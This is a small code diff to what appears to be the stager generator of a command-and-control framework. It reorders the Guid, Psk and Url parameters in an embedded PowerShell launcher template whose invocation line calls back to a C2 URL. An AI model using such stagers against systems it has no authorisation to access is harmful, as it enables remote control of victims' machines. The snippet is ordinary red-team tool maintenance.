@@ -1,5 +1,4 @@
 import logging
-import secrets
 import uuid
 from core.utils import gen_random_string
 from core.teamserver.stager import Stager
@@ -37,12 +36,14 @@ class STStager(Stager):
 {{
     [CmdletBinding()]
     param (
+        [Parameter(Mandatory=$true)][String]$Guid,
+        [Parameter(Mandatory=$true)][String]$Psk,
         [Parameter(Mandatory=$true)][String]$Url
     )
 
     {template}
 }}
-Invoke-{function_name} -Url {c2_url} -Psk {psk} -Guid {guid}
+Invoke-{function_name} -Guid {guid} -Psk {psk} -Url {c2_url}
 """
                 else:
                     template = template.replace("$Url", f'{c2_url}')
